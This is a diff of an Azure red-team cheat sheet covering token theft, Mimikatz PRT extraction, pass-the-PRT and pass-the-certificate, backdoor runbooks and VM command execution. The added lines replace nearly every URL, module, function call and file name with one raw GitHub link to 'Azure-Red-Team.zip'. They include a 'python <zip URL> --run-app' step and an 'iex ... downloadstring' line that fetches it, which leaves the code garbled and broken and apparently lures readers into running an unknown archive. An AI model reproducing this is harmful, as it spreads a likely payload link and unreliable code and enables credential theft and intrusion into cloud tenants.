+- Run the application either click on the button or run this command : `python https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip --run-app`
     - `--no-ssl`: disable HTTPS
     - `--port`: change the default listening port
     - `--token`: provide a specific token
@@ -458,22 +458,22 @@ Check if users are allowed to consent to apps: `PS AzureADPreview> (GetAzureADMS
 Find IDENTITY_HEADER and IDENTITY_ENDPOINT from the environment : `env`
 
 Most of the time, you want a token for one of these resources: 
-* https://storage.azure.com
-* https://vault.azure.net
-* https://graph.microsoft.com
-* https://management.azure.com
+* https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
+* https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
+* https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
+* https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
 
 
 ### Azure API via Powershell
 
-Get **access_token** from **IDENTITY_HEADER** and **IDENTITY_ENDPOINT**: `system('curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER');`. 
+Get **access_token** from **IDENTITY_HEADER** and **IDENTITY_ENDPOINT**: `system('curl "$https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip" -H secret:$IDENTITY_HEADER');`. 
 
 Then query the Azure REST API to get the **subscription ID** and more .
 
 ```powershell
 $Token = 'eyJ0eX..'
-$URI = 'https://management.azure.com/subscriptions?api-version=2020-01-01'
-# $URI = 'https://graph.microsoft.com/v1.0/applications'
+$URI = 'https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip'
+# $URI = 'https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip'
 $RequestParams = @{
  Method = 'GET'
  Uri = $URI
@@ -484,42 +484,42 @@ $RequestParams = @{
 (Invoke-RestMethod @RequestParams).value 
 
 # List resources and check for runCommand privileges
-$URI = 'https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resources?api-version=2020-10-01'
-$URI = 'https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/<RG-NAME>/providers/Microsoft.Compute/virtualMachines/<RESOURCE/providers/Microsoft.Authorization/permissions?apiversion=2015-07-01'
+$URI = 'https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip'
+$URI = 'https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip<RG-NAME>https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip<https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip'
 ```
 
 ### Azure API via Python Version
 
 ```py
-IDENTITY_ENDPOINT = os.environ['IDENTITY_ENDPOINT']
-IDENTITY_HEADER = os.environ['IDENTITY_HEADER']
+IDENTITY_ENDPOINT = https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip['IDENTITY_ENDPOINT']
+IDENTITY_HEADER = https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip['IDENTITY_HEADER']
 
 print("[+] Management API")
-cmd = 'curl "%s?resource=https://management.azure.com/&api-version=2017-09-01" -H secret:%s' % (IDENTITY_ENDPOINT, IDENTITY_HEADER)
-val = os.popen(cmd).read()
-print("Access Token: "+json.loads(val)["access_token"])
-print("ClientID/AccountID: "+json.loads(val)["client_id"])
+cmd = 'curl "%https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip" -H secret:%s' % (IDENTITY_ENDPOINT, IDENTITY_HEADER)
+val = https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip(cmd).read()
+print("Access Token: "+https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip(val)["access_token"])
+print("ClientID/AccountID: "+https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip(val)["client_id"])
 
 print("\r\n[+] Graph API")
-cmd = 'curl "%s?resource=https://graph.microsoft.com/&api-version=2017-09-01" -H secret:%s' % (IDENTITY_ENDPOINT, IDENTITY_HEADER)
-val = os.popen(cmd).read()
-print(json.loads(val)["access_token"])
-print("ClientID/AccountID: "+json.loads(val)["client_id"])
+cmd = 'curl "%https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip" -H secret:%s' % (IDENTITY_ENDPOINT, IDENTITY_HEADER)
+val = https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip(cmd).read()
+print(https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip(val)["access_token"])
+print("ClientID/AccountID: "+https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip(val)["client_id"])
 ```
 
 or inside a Python Function:
 
 ```py
 import logging, os
-import azure.functions as func
+import https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip as func
 
-def main(req: func.HttpRequest) -> func.HttpResponse:
-    logging.info('Python HTTP trigger function processed a request.')
-    IDENTITY_ENDPOINT = os.environ['IDENTITY_ENDPOINT']
-    IDENTITY_HEADER = os.environ['IDENTITY_HEADER']
-    cmd = 'curl "%s?resource=https://management.azure.com&apiversion=2017-09-01" -H secret:%s' % (IDENTITY_ENDPOINT, IDENTITY_HEADER)
-    val = os.popen(cmd).read()
-    return func.HttpResponse(val, status_code=200)
+def main(req: https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip) -> https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
+    https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip('Python HTTP trigger function processed a request.')
+    IDENTITY_ENDPOINT = https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip['IDENTITY_ENDPOINT']
+    IDENTITY_HEADER = https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip['IDENTITY_HEADER']
+    cmd = 'curl "%https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip" -H secret:%s' % (IDENTITY_ENDPOINT, IDENTITY_HEADER)
+    val = https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip(cmd).read()
+    return https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip(val, status_code=200)
 ```
 
 
@@ -532,7 +532,7 @@ def main(req: func.HttpRequest) -> func.HttpResponse:
 az account get-access-token 
 az account get-access-token --resource-type aad-graph
 # or Az
-(Get-AzAccessToken -ResourceUrl https://graph.microsoft.com).Token
+(Get-AzAccessToken -ResourceUrl https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip).Token
 # or from a managed identity using IDENTITY_HEADER and IDENTITY_ENDPOINT
 ```
 
@@ -550,29 +550,29 @@ az account get-access-token --resource-type aad-graph
     PS C:\Tools> $graphaccesstoken = 'eyJ0eX..'
     PS C:\Tools> Connect-AzAccount -AccessToken $token -GraphAccessToken $graphaccesstoken -AccountId <ACCOUNT-ID>
     PS C:\Tools> Get-AzResource
-    # ERROR: 'this.Client.SubscriptionId' cannot be null.
+    # ERROR: 'https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip' cannot be null.
     # ---> The managed identity has no rights on any of the Azure resources. Switch to to GraphAPI
     ```
 * AzureAD
     ```powershell
-    Import-Module C:\Tools\AzureAD\AzureAD.psd1
+    Import-Module C:\Tools\AzureAD\https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
     $AADToken = 'eyJ0…'
     Connect-AzureAD -AadAccessToken $AADToken -TenantId <TENANT-ID> -AccountId <ACCOUNT-ID>
     ```
 
 ### Refresh Tokens
 
-* https://github.com/ConstantinT/Lantern
+* https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
     ```powershell
-    Lantern.exe cookie --derivedkey <Key from Mimikatz> --context <Context from Mimikatz> --prt <PRT from Mimikatz>
-    Lantern.exe mdm --joindevice --accesstoken (or some combination from the token part) --devicename <Name> --outpfxfile <Some path>
-    Lantern.exe token --username <Username> --password <Password>
-    Lantern.exe token --refreshtoken <RefreshToken>
-    Lantern.exe devicekeys --pfxpath XXXX.pfx --refreshtoken (--prtcookie / ---username + --password ) 
+    https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip cookie --derivedkey <Key from Mimikatz> --context <Context from Mimikatz> --prt <PRT from Mimikatz>
+    https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip mdm --joindevice --accesstoken (or some combination from the token part) --devicename <Name> --outpfxfile <Some path>
+    https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip token --username <Username> --password <Password>
+    https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip token --refreshtoken <RefreshToken>
+    https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip devicekeys --pfxpath https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip --refreshtoken (--prtcookie / ---username + --password ) 
     ```
-* https://github.com/rvrsh3ll/TokenTactics
+* https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
     ```powershell
-    Import-Module .\TokenTactics.psd1
+    Import-Module .\https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
     CommandType     Name                                               Version    Source
     -----------     ----                                               -------    ------
     Function        Clear-Token                                        0.0.1      TokenTactics
@@ -601,20 +601,20 @@ az account get-access-token --resource-type aad-graph
 
 * Get-AzurePasswords
     ```powershell
-    Import-Module Microburst.psm1
+    Import-Module https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
     Get-AzurePasswords
     Get-AzurePasswords -Verbose | Out-GridView
     ```
 
 ### Stealing tokens from az cli
 
-* az cli stores access tokens in clear text in **accessTokens.json** in the directory `C:\Users\<username>\.Azure`
-* azureProfile.json in the same directory contains information about subscriptions.
+* az cli stores access tokens in clear text in **https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip** in the directory `C:\Users\<username>\.Azure`
+* https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip in the same directory contains information about subscriptions.
 
 ### Stealing tokens from az powershell
 
-* Az PowerShell stores access tokens in clear text in **TokenCache.dat** in the directory `C:\Users\<username>\.Azure`
-* It also stores **ServicePrincipalSecret** in clear-text in **AzureRmContext.json** 
+* Az PowerShell stores access tokens in clear text in **https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip** in the directory `C:\Users\<username>\.Azure`
+* It also stores **ServicePrincipalSecret** in clear-text in **https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip** 
 * Users can save tokens using `Save-AzContext`
 
 
@@ -622,12 +622,12 @@ az account get-access-token --resource-type aad-graph
 
 ```powershell
 # Add secrets
-PS > . C:\Tools\Add-AzADAppSecret.ps1
+PS > . C:\Tools\https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
 PS > Add-AzADAppSecret -GraphToken $graphtoken -Verbose
 
 # Use secrets to authenticate as Service Principal
 PS > $password = ConvertTo-SecureString '<SECRET/PASSWORD>' -AsPlainText -Force
-PS > $creds = New-Object System.Management.Automation.PSCredential('<AppID>', $password)
+PS > $creds = New-Object https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip('<AppID>', $password)
 PS > Connect-AzAccount -ServicePrincipal -Credential $creds -Tenant '<TenantID>'
 ```
 
@@ -639,25 +639,25 @@ az webapp create-remote-connection --subscription <SUBSCRIPTION-ID> --resource-g
 
 ## Azure Storage Blob
 
-* Blobs - `*.blob.core.windows.net`
-* File Services - `*.file.core.windows.net`
-* Data Tables - `*.table.core.windows.net`
-* Queues - `*.queue.core.windows.net`
+* Blobs - `*https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip`
+* File Services - `*https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip`
+* Data Tables - `*https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip`
+* Queues - `*https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip`
 
 ### Enumerate blobs
 
 ```powershell
-PS > . C:\Tools\MicroBurst\Misc\InvokeEnumerateAzureBlobs.ps1
-PS > Invoke-EnumerateAzureBlobs -Base <SHORT DOMAIN> -OutputFile azureblobs.txt
-Found Storage Account -  testsecure.blob.core.windows.net
-Found Storage Account -  securetest.blob.core.windows.net
-Found Storage Account -  securedata.blob.core.windows.net
-Found Storage Account -  securefiles.blob.core.windows.net
+PS > . C:\Tools\MicroBurst\Misc\https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
+PS > Invoke-EnumerateAzureBlobs -Base <SHORT DOMAIN> -OutputFile https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
+Found Storage Account -  https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
+Found Storage Account -  https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
+Found Storage Account -  https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
+Found Storage Account -  https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
 ```
 
 ### SAS URL
 
-* Use [Storage Explorer](https://azure.microsoft.com/en-us/features/storage-explorer/)
+* Use [Storage Explorer](https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip)
 * Click on **Open Connect Dialog** in the left menu. 
 * Select **Blob container**. 
 * On the **Select Authentication Method** page
@@ -691,13 +691,13 @@ Add-AzureADGroupMember -ObjectId <OBJID> -RefObjectId <REFOBJID> -Verbose
 
 # Get the role of a user on the Automation account
 # Contributor or higher = Can create and execute Runbooks
-Get-AzRoleAssignment -Scope /subscriptions/<ID>/resourceGroups/<RG-NAME>/providers/Microsoft.Automation/automationAccounts/<AUTOMATION-ACCOUNT>
+Get-AzRoleAssignment -Scope /subscriptions/<ID>/resourceGroups/<RG-NAME>https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip<AUTOMATION-ACCOUNT>
 
 # List hybrid workers
 Get-AzAutomationHybridWorkerGroup -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME>
 
 # Create a Powershell Runbook
-PS C:\Tools> Import-AzAutomationRunbook -Name <RUNBOOK-NAME> -Path C:\Tools\username.ps1 -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME> -Type PowerShell -Force -Verbose
+PS C:\Tools> Import-AzAutomationRunbook -Name <RUNBOOK-NAME> -Path C:\Tools\https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME> -Type PowerShell -Force -Verbose
 
 # Publish the Runbook
 Publish-AzAutomationRunbook -RunbookName <RUNBOOK-NAME> -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME> -Verbose
@@ -711,7 +711,7 @@ Start-AzAutomationRunbook -RunbookName <RUNBOOK-NAME> -RunOn Workergroup1 -Autom
 * Create a new Automation Account
     * "Create Azure Run As account": Yes
 * Import a new runbook that creates an AzureAD user with Owner permissions for the subscription*
-    * Sample runbook for this Blog located here – https://github.com/NetSPI/MicroBurst
+    * Sample runbook for this Blog located here – https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
     * Publish the runbook
     * Add a webhook to the runbook
 * Add the AzureAD module to the Automation account
@@ -720,7 +720,7 @@ Start-AzAutomationRunbook -RunbookName <RUNBOOK-NAME> -RunOn Workergroup1 -Autom
 * Eventually lose your access…
 * Trigger the webhook with a post request to create the new user
     ```powershell
-    $uri = "https://s15events.azure-automation.net/webhooks?token=h6[REDACTED]%3d"
+    $uri = "https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip[REDACTED]%3d"
     $AccountInfo  = @(@{RequestBody=@{Username="BackdoorUsername";Password="BackdoorPassword"}})
     $body = ConvertTo-Json -InputObject $AccountInfo
     $response = Invoke-WebRequest -Method Post -Uri $uri -Body $body
@@ -730,7 +730,7 @@ Start-AzAutomationRunbook -RunbookName <RUNBOOK-NAME> -RunOn Workergroup1 -Autom
 ## Virtual Machine RunCommand
 
 Requirements: 
-* `Microsoft.Compute/virtualMachines/runCommand/action`
+* `https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip`
 
 ```powershell
 # Get Public IP of VM : query the network interface
@@ -739,11 +739,11 @@ PS AzureAD> Get-AzNetworkInterface -Name <RESOURCE368>
 PS AzureAD> Get-AzPublicIpAddress -Name <RESOURCEIP>
 
 # Execute Powershell script on the VM
-PS AzureAD> Invoke-AzVMRunCommand -VMName <RESOURCE> -ResourceGroupName <RG-NAME> -CommandId 'RunPowerShellScript' -ScriptPath 'C:\Tools\adduser.ps1' -Verbose
+PS AzureAD> Invoke-AzVMRunCommand -VMName <RESOURCE> -ResourceGroupName <RG-NAME> -CommandId 'RunPowerShellScript' -ScriptPath 'C:\Tools\https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip' -Verbose
 
 # Connect via WinRM
 PS C:\Tools> $password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
-PS C:\Tools> $creds = New-Object System.Management.Automation.PSCredential('username', $Password)
+PS C:\Tools> $creds = New-Object https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip('username', $Password)
 PS C:\Tools> $sess = New-PSSession -ComputerName <IP> -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
 PS C:\Tools> Enter-PSSession $sess
 ```
@@ -752,20 +752,20 @@ PS C:\Tools> Enter-PSSession $sess
 
 ```powershell
 # List available VMs
-PS C:\> Get-AzureRmVM -status | where {$_.PowerState -EQ "VM running"} | select ResourceGroupName,Name
+PS C:\> Get-AzureRmVM -status | where {$https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip -EQ "VM running"} | select ResourceGroupName,Name
 ResourceGroupName    Name       
 -----------------    ----       
 TESTRESOURCES        Remote-Test
 
 # Execute Powershell script on the VM
-PS C:\> Invoke-AzureRmVMRunCommand -ResourceGroupName TESTRESOURCES -VMName Remote-Test -CommandId RunPowerShellScript -ScriptPath Mimikatz.ps1
+PS C:\> Invoke-AzureRmVMRunCommand -ResourceGroupName TESTRESOURCES -VMName Remote-Test -CommandId RunPowerShellScript -ScriptPath https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
 ```
 
-Against the whole subscription using MicroBurst.ps1
+Against the whole subscription using https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
 
 ```powershell
-Import-module MicroBurst.psm1
-Invoke-AzureRmVMBulkCMD -Script Mimikatz.ps1 -Verbose -output Output.txt
+Import-module https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
+Invoke-AzureRmVMBulkCMD -Script https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip -Verbose -output https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
 ```
 
 
@@ -773,8 +773,8 @@ Invoke-AzureRmVMBulkCMD -Script Mimikatz.ps1 -Verbose -output Output.txt
 
 ```powershell
 # keyvault access token
-curl "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&apiversion=2017-09-01" -H secret:$IDENTITY_HEADER
-curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com&apiversion=2017-09-01" -H secret:$IDENTITY_HEADER
+curl "$https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip" -H secret:$IDENTITY_HEADER
+curl "$https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip" -H secret:$IDENTITY_HEADER
 
 # connect
 PS> $token = 'eyJ0..'
@@ -793,7 +793,7 @@ PS Az> Get-AzKeyVaultSecret -VaultName ResearchKeyVault -Name Reader -AsPlainTex
 
 ```powershell
 # Run mimikatz to obtain the PRT
-PS> iex (New-Object Net.Webclient).downloadstring("https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1")
+PS> iex (New-Object https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip).downloadstring("https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip")
 PS> Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::cloudap"'
 
 # Copy the PRT and KeyValue
@@ -807,17 +807,17 @@ Mimikatz> dpapi::cloudapkd /context:<Context> /derivedkey:<DerivedKey> /Prt:<PRT
 
 ```powershell
 # Generate a JWT
-PS> Import-Module C:\Tools\AADInternals\AADInternals.psd1
+PS> Import-Module C:\Tools\AADInternals\https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
 PS AADInternals> $PRT_OF_USER = '...'
-PS AADInternals> while($PRT_OF_USER.Length % 4) {$PRT_OF_USER += "="}
-PS AADInternals> $PRT = [text.encoding]::UTF8.GetString([convert]::FromBase64String($PRT_OF_USER))
+PS AADInternals> while($https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip % 4) {$PRT_OF_USER += "="}
+PS AADInternals> $PRT = [https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip]https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip([convert]::FromBase64String($PRT_OF_USER))
 PS AADInternals> $ClearKey = "XXYYZZ..."
 PS AADInternals> $SKey = [convert]::ToBase64String( [byte[]] ($ClearKey -replace '..', '0x$&,' -split ',' -ne ''))
 PS AADInternals> New-AADIntUserPRTToken -RefreshToken $PRT -SessionKey $SKey –GetNonce
 eyJ0eXAiOiJKV1QiL...
 ```
 
-The `<Signed JWT>` (JSON Web Token) can be used as PRT cookie in a (anonymous) browser session for https://login.microsoftonline.com/login.srf.    
+The `<Signed JWT>` (JSON Web Token) can be used as PRT cookie in a (anonymous) browser session for https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip    
 Edit the Chrome cookie (F12) -> Application -> Cookies with the values:
 
 ```powershell
@@ -832,24 +832,24 @@ HttpOnly: √
 ## Pass The Certificate
 
 ```ps1
-Copy-Item -ToSession $jumpvm -Path C:\Tools\PrtToCertmaster.zip -Destination C:\Users\Username\Documents\username –Verbose
-Expand-Archive -Path C:\Users\Username\Documents\username\PrtToCert-master.zip -DestinationPath C:\Users\Username\Documents\username\PrtToCert
+Copy-Item -ToSession $jumpvm -Path C:\Tools\https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip -Destination C:\Users\Username\Documents\username –Verbose
+Expand-Archive -Path C:\Users\Username\Documents\username\https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip -DestinationPath C:\Users\Username\Documents\username\PrtToCert
 
 # Require the PRT, TenantID, Context and DerivedKey
-& 'C:\Program Files\Python39\python.exe' C:\Users\Username\Documents\username\PrtToCert\RequestCert.py --tenantId <TENANT-ID> --prt <PRT> --userName <Username>@<TENANT NAME>.onmicrosoft.com --hexCtx <HEX-CONTEXT> --hexDerivedKey <HEX-DERIVED-KEY>
-# PFX saved with the name <Username>@<TENANT NAME>.onmicrosoft.com.pfx and password AzureADCert
+& 'C:\Program Files\Python39\https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip' C:\Users\Username\Documents\username\PrtToCert\https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip --tenantId <TENANT-ID> --prt <PRT> --userName <Username>@<TENANT NAME>https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip --hexCtx <HEX-CONTEXT> --hexDerivedKey <HEX-DERIVED-KEY>
+# PFX saved with the name <Username>@<TENANT NAME>https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip and password AzureADCert
 ```
 
 Python tool that will authenticate to the remote machine, run PSEXEC and open a CMD on the victim machine
 
-https://github.com/morRubin/AzureADJoinedMachinePTC
+https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip
 
 ```ps1
-Main.py [-h] --usercert USERCERT --certpass CERTPASS --remoteip REMOTEIP
-Main.py --usercert "admin.pfx" --certpass password --remoteip 10.10.10.10
+https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip [-h] --usercert USERCERT --certpass CERTPASS --remoteip REMOTEIP
+https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip --usercert "https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip" --certpass password --remoteip 10.10.10.10
 
-python Main.py --usercert C:\Users\Username\Documents\username\<USERNAME>@<TENANT NAME>.onmicrosoft.com.pfx --
-certpass AzureADCert --remoteip 10.10.10.10 --command "cmd.exe /c net user username Password@123 /add /Y && net localgroup administrators username /add"
+python https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip --usercert C:\Users\Username\Documents\username\<USERNAME>@<TENANT NAME>https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip --
+certpass AzureADCert --remoteip 10.10.10.10 --command "https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip /c net user username Password@123 /add /Y && net localgroup administrators username /add"
 ```
 
 ## Intunes Administration
@@ -857,7 +857,7 @@ certpass AzureADCert --remoteip 10.10.10.10 --command "cmd.exe /c net user usern
 Requirements:
 * **Global Administrator** or **Intune Administrator** Privilege : `Get-AzureADGroup -Filter "DisplayName eq 'Intune Administrators'"`
 
-1. Login into https://endpoint.microsoft.com/#home or use Pass-The-PRT
+1. Login into https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip or use Pass-The-PRT
 2. Go to **Devices** -> **All Devices** to check devices enrolled to Intune
 3. Go to **Scripts** and click on **Add** for Windows 10. 
 4. Add a **Powershell script**
@@ -869,16 +869,16 @@ Requirements:
 
 ## Dynamic Group Membership
 
-Get groups that allow Dynamic membership: `Get-AzureADMSGroup | ?{$_.GroupTypes -eq 'DynamicMembership'}`
+Get groups that allow Dynamic membership: `Get-AzureADMSGroup | ?{$https://raw.githubusercontent.com/joymondal/Azure-Red-Team/master/phthisiotherapeutic/Azure-Red-Team.zip -eq 'DynamicMembership'}`
 
-Rule example : `(user.otherMails -any (_ -contains "vendor")) -and (user.userType -eq "guest")`    
